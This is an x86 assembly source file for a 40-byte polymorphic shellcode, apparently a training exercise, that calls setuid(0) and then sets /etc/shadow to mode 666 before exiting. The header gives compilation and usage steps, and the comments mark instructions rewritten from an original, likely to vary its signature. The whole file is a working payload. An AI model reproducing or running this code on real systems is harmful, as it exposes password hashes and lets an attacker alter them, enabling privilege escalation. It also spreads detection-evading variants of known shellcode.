; Filname: chmod_etc_shadow_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Chmod 666 /etc/shadow on the local host
; Compilation: ./compile.sh chmod_etc_shadow_poly
; Usage: sudo ./chmod_etc_shadow_poly
; Shellcode size: 40 bytes
; Architecture: x86

global   _start

section .text
        _start:

	sub ebx, ebx			; initialize register // changed the method
	push 0x17			; push 0x17 onto the stack // changed the method
	pop eax				; pop eax onto the stack // changed the method
	int 0x80			; call the interrupt to execute the setuid syscall
	sub eax, eax			; initialize register // changed the method
	push eax			; push eax onto the stack
	push 0x776f6461			; 'woda'	
        push 0x68732f63			; 'hs/c'
        push 0x74652f2f			; 'te//'
	mov ebx, esp			; move esp into ebx
	mov cl, 0xb6			; move 0xb6 into cl // replaced mov cx, 0x1b6
	mov ch, 0x1			; move 0x1 into ch // replaced mov al, 0xf
        add al, 15			; add 15 to al // added instruction
        int 0x80			; call the interrupt to execute the chmod syscall
        add eax, 1			; add 1 to eax // changed the method
        int 0x80			; call the interrupt to exit
	
